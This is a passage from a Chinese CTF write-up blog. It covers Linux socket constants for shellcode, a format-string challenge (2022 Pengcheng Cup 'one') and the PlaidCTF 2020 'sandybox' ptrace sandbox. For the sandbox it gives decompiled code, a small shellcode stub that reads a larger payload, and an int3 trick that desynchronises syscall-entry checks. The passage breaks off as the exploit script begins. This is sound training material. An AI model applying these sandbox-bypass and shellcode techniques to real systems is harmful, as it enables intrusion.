AF_VSOCK40<span class="comment">/* vSockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_KCM41<span class="comment">/* Kernel Connection Multiplexor*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_QIPCRTR42<span class="comment">/* Qualcomm IPC Router          */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_SMC43<span class="comment">/* smc sockets: reserve number for</span></span></span><br><span class="line"><span class="comment"><span class="meta"> * PF_SMC protocol family that</span></span></span><br><span class="line"><span class="comment"><span class="meta"> * reuses AF_INET address family</span></span></span><br><span class="line"><span class="comment"><span class="meta"> */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_XDP44<span class="comment">/* XDP sockets*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MCTP45<span class="comment">/* Management component</span></span></span><br><span class="line"><span class="comment"><span class="meta"> * transport protocol</span></span></span><br><span class="line"><span class="comment"><span class="meta"> */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AF_MAX46<span class="comment">/* For now.. */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Protocol families, same as address families. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_UNSPECAF_UNSPEC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_UNIXAF_UNIX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_LOCALAF_LOCAL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_INETAF_INET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_AX25AF_AX25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IPXAF_IPX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_APPLETALKAF_APPLETALK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>PF_NETROMAF_NETROM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_BRIDGEAF_BRIDGE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ATMPVCAF_ATMPVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_X25AF_X25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_INET6AF_INET6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ROSEAF_ROSE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_DECnetAF_DECnet</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NETBEUIAF_NETBEUI</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SECURITYAF_SECURITY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_KEYAF_KEY</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NETLINKAF_NETLINK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ROUTEAF_ROUTE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PACKETAF_PACKET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ASHAF_ASH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ECONETAF_ECONET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ATMSVCAF_ATMSVC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_RDSAF_RDS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SNAAF_SNA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IRDAAF_IRDA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PPPOXAF_PPPOX</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_WANPIPEAF_WANPIPE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_LLCAF_LLC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IBAF_IB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MPLSAF_MPLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_CANAF_CAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_TIPCAF_TIPC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_BLUETOOTHAF_BLUETOOTH</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IUCVAF_IUCV</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_RXRPCAF_RXRPC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ISDNAF_ISDN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_PHONETAF_PHONET</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_IEEE802154AF_IEEE802154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_CAIFAF_CAIF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_ALGAF_ALG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_NFCAF_NFC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_VSOCKAF_VSOCK</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_KCMAF_KCM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_QIPCRTRAF_QIPCRTR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_SMCAF_SMC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_XDPAF_XDP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MCTPAF_MCTP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PF_MAXAF_MAX</span></span><br></pre></td></tr></table></figure><p>第三个参数和第一个是对应的,当然不是说这两个参数要选择完全一样的</p><p>第二个参数用于指定TCP或UDP等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * enum sock_type - Socket types</span></span><br><span class="line"><span class="comment"> * @SOCK_STREAM: stream (connection) socket</span></span><br><span class="line"><span class="comment"> * @SOCK_DGRAM: datagram (conn.less) socket</span></span><br><span class="line"><span class="comment"> * @SOCK_RAW: raw socket</span></span><br><span class="line"><span class="comment"> * @SOCK_RDM: reliably-delivered message</span></span><br><span class="line"><span class="comment"> * @SOCK_SEQPACKET: sequential packet socket</span></span><br><span class="line"><span class="comment"> * @SOCK_DCCP: Datagram Congestion Control Protocol socket</span></span><br><span class="line"><span class="comment"> * @SOCK_PACKET: linux specific way of getting packets at the dev level.</span></span><br><span class="line"><span class="comment"> *  For writing rarp and other similar things on the user level.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When adding some new socket type please</span></span><br><span class="line"><span class="comment"> * grep ARCH_HAS_SOCKET_TYPE include/asm-* /socket.h, at least MIPS</span></span><br><span class="line"><span class="comment"> * overrides this enum for binary compat reasons.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">sock_type</span> &#123;</span></span><br><span class="line">SOCK_STREAM= <span class="number">1</span>,</span><br><span class="line">SOCK_DGRAM= <span class="number">2</span>,</span><br><span class="line">SOCK_RAW= <span class="number">3</span>,</span><br><span class="line">SOCK_RDM= <span class="number">4</span>,</span><br><span class="line">SOCK_SEQPACKET= <span class="number">5</span>,</span><br><span class="line">SOCK_DCCP= <span class="number">6</span>,</span><br><span class="line">SOCK_PACKET= <span class="number">10</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>像这题使用的是socket(2,1,0)(<u>不知道为什么socket(2,1,2)不行</u>)</p><p>之后是<strong>int __sys_connect(int fd, struct sockaddr __user *uservaddr, int addrlen)</strong></p><p>第一个参数是之前socket的返回<code>fd</code></p><p>第三个一般是<code>0x10</code></p><p>第二个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line"><span class="type">sa_family_t</span>sa_family;<span class="comment">/* address family, AF_xxx*/</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">char</span> sa_data_min[<span class="number">14</span>];<span class="comment">/* Minimum 14 bytes of protocol address*/</span></span><br><span class="line">DECLARE_FLEX_ARRAY(<span class="type">char</span>, sa_data);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里用的是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __SOCK_SIZE__16<span class="comment">/* sizeof(struct sockaddr)*/</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">  <span class="type">__kernel_sa_family_t</span>sin_family;<span class="comment">/* Address family*/</span></span><br><span class="line">  __be16sin_port;<span class="comment">/* Port number*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span><span class="title">sin_addr</span>;</span><span class="comment">/* Internet address*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pad to size of `struct sockaddr&#x27;. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>__pad[__SOCK_SIZE__ - <span class="keyword">sizeof</span>(<span class="type">short</span> <span class="type">int</span>) -</span><br><span class="line"><span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span>) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> in_addr)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>需要注意协议<code>sin_family</code>是小端</p><p><code>sin_port</code>和<code>sin_addr</code>则是大端(网络字节序)</p><h1 id="2022鹏城杯-one"><a href="#2022鹏城杯-one" class="headerlink" title="2022鹏城杯-one"></a>2022鹏城杯-one</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序就是给出一个栈地址,之后关闭标准输出,并给出一个格式化字符串漏洞</p><p>主要用到printf函数会在栈上留下一些libc符号信息,例如__IO_2_1_stdout</p><p>如果修改printf的返回地址,就有可能使之保留在栈上</p><p>之后再次利用格式化字符串将stdout指向stderr,从而恢复正常的输出</p><h1 id="Plaid2020-sandybox"><a href="#Plaid2020-sandybox" class="headerlink" title="Plaid2020-sandybox"></a>Plaid2020-sandybox</h1><p>这题实现沙盒的方式有点意思,</p><p>以往pwn题实现沙盒一般都是使用seccomp或者prctl相关调用</p><p>但是这题是通过ptrace这个调用实现的</p><p>开头的sub_1330的作用主要是设置一些cpu相关</p><blockquote><p>Program does have some <code>rlimits</code> limitations, restricting the cpu usage, file sizes and numer of processes. Nothing interesting.</p></blockquote><p>之后便是调用fork</p><p><strong>子进程</strong></p><p>子进程中的<code>prctl(1, 9LL)</code> 的作用是设置当前进程的核心转储行为，使之允许生成核心转储文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = __errno_location();</span><br><span class="line">  v5 = strerror(*v4);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;child traceme %s\n&quot;</span>, v5);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL)</code>使得子进程暂停并等待父进程trace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v9 = getpid();</span><br><span class="line">kill(v9, <span class="number">19</span>);</span><br></pre></td></tr></table></figure><p>之后发送<code>SIGSTOP</code>信号(我之前一直以为kill是真kill orz)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_D10</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (*v0)(<span class="type">void</span>); <span class="comment">// r12</span></span><br><span class="line">  <span class="type">void</span> (*v1)(<span class="type">void</span>); <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  syscall(<span class="number">37LL</span>, <span class="number">20LL</span>);</span><br><span class="line">  v0 = (<span class="type">void</span> (*)(<span class="type">void</span>))mmap(<span class="number">0LL</span>, <span class="number">0xA</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, v1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    v1 = (<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)v1 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != (<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)v0 + <span class="number">10</span>) );</span><br><span class="line">  v0();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是子进程的真正部分了</p><p>读入十个字节并执行,这里要注意当执行到这里时rsi刚好就是v0+10</p><p>所以完全可以读入更多shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 1000</span><br><span class="line">pop rdx</span><br><span class="line">xor eax, eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><strong>父进程</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( waitpid(v3, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> || (_BYTE)stat_loc != <span class="number">127</span> || BYTE1(stat_loc) != <span class="number">19</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = __errno_location();</span><br><span class="line">  v14 = strerror(*v13);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;initial waitpid fail 0x%x %s\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)stat_loc, v14);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>waitpid</code> 函数的作用是阻塞当前进程，直到指定的子进程中的一个发生变化为止。变化可能是子进程终止、暂停、继续执行或者被恢复执行等。</p><p>stat_loc用于存储信号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_SETOPTIONS, v12, <span class="number">0LL</span>, <span class="number">0x100000</span>LL);</span><br></pre></td></tr></table></figure><p>设置跟踪进程的选项，以便跟踪进程的退出状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(PTRACE_SYSCALL, v12, <span class="number">0LL</span>, v15) )</span><br><span class="line">  &#123;</span><br><span class="line">    v21 = *__errno_location();</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = strerror(v21);</span><br><span class="line">      __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;ptrace syscall1 %s\n&quot;</span>, v22);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( waitpid(v12, &amp;stat_loc, <span class="number">0x40000000</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)stat_loc != <span class="number">127</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;so long, sucker 0x%x\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = BYTE1(stat_loc);</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(stat_loc) == <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  __dprintf_chk(<span class="number">2LL</span>, <span class="number">1LL</span>, <span class="string">&quot;child signal %d\n&quot;</span>, BYTE1(stat_loc));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PTRACE_SYSCALL</code> 标志表示要执行的操作是单步执行系统调用。这意味着被跟踪的进程将在<strong><u>下一个</u></strong>系统调用发生时停止,并等待跟踪父进程接收通知。</p><p>信号5是 SIGTRAP 信号。SIGTRAP信号是一个特殊的信号，用于调试和跟踪进程的执行。用于通知目标进程停止执行，以便调试器可以执行相关操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptrace(PTRACE_GETREGS, v12, <span class="number">0LL</span>, v30) )</span><br><span class="line">&#123;</span><br><span class="line">  v23 = __errno_location();</span><br><span class="line">  v24 = strerror(*v23);</span><br><span class="line">  __dprintf_chk(<span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;ptrace getregs %s\n&quot;</span>, v24);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到所有的寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_DA0</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="keyword">struct</span> user_regs_struct *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 orig_ax; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 di; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int128 v7; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  orig_ax = a2-&gt;orig_ax;</span><br><span class="line">  <span class="keyword">if</span> ( orig_ax != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax &gt; <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( orig_ax == <span class="number">37</span> )</span><br><span class="line">        <span class="keyword">return</span> a2-&gt;di - <span class="number">1</span> &gt; <span class="number">0x13</span>;</span><br><span class="line">      <span class="keyword">if</span> ( orig_ax &lt;= <span class="number">0x25</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( orig_ax &lt;= <span class="number">0xB</span> )</span><br><span class="line">          <span class="keyword">return</span> a2-&gt;si &gt; <span class="number">0x1000</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> orig_ax != <span class="number">60</span> &amp;&amp; orig_ax != <span class="number">231</span> &amp;&amp; orig_ax != <span class="number">39</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !a2-&gt;si )</span><br><span class="line">      &#123;</span><br><span class="line">        di = a2-&gt;di;</span><br><span class="line">        v8 = <span class="number">0</span>;</span><br><span class="line">        v7 = <span class="number">0LL</span>;</span><br><span class="line">        v5 = ptrace(PTRACE_PEEKDATA, a1, di, <span class="number">0LL</span>);</span><br><span class="line">        v6 = ptrace(PTRACE_PEEKDATA, a1, a2-&gt;di + <span class="number">8</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">-1</span> &amp;&amp; v6 != <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)&amp;v7 = v5;</span><br><span class="line">          *((_QWORD *)&amp;v7 + <span class="number">1</span>) = v6;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7) &lt;= <span class="number">0xF</span></span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &amp;&amp; !<span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;proc&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;v7, <span class="string">&quot;sys&quot;</span>) != <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( orig_ax &gt;= <span class="number">2</span> &amp;&amp; orig_ax != <span class="number">3</span> &amp;&amp; orig_ax != <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是一个check</p><p><code>PTRACE_PEEKDATA</code> 标志表示进行读取进程信息,第三个参数是目标地址</p><p>这里对不少系统调用做了限制,逆向挺简单的,就不分析了</p><h2 id="int3绕过"><a href="#int3绕过" class="headerlink" title="int3绕过"></a>int3绕过</h2><p>且看man ptrace</p><blockquote><pre><code>   PTRACE_SYSCALL, PTRACE_SINGLESTEP          Restart the stopped tracee as for PTRACE_CONT, but arrange for the tracee to be          stopped  at the next entry to or exit from a system call, or after execution of          a single instruction, respectively.   (The  tracee  will  also,  as  usual,  be          stopped  upon  receipt of a signal.)  From the tracer&#39;s perspective, the tracee          will  appear  to  have  been  stopped  by  receipt  of  a  SIGTRAP.   So,   for          PTRACE_SYSCALL, for example, the idea is to inspect the arguments to the system          call at the first stop, then do another PTRACE_SYSCALL and inspect  the  return          value  of  the system call at the second stop.  The data argument is treated as          for PTRACE_CONT.  (addr is ignored.)</code></pre></blockquote><p>可以看到ptrace(PTRACE_SYSCALL,…)<u><strong>不仅会在进入syscall时停止,而且还会在退出时停止</strong></u></p><p>并且最重要的是其并<u>无法识别此时究竟是进入syscall还是退出syscall</u></p><p>那么如果我们颠倒检查的顺序,那么check的就是退出时候的寄存器,而真正进入syscall时却没有检查</p><p>至于如何做到就要利用<code>int 3</code>这个软中断,<code>int 3</code>我们都知道是用于调试目的的软件中断,当触发 <code>int 3</code> 中断的时候，调试器会捕获到这个中断，误以为此时是进入syscall,然后暂停程序的执行进行检查</p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 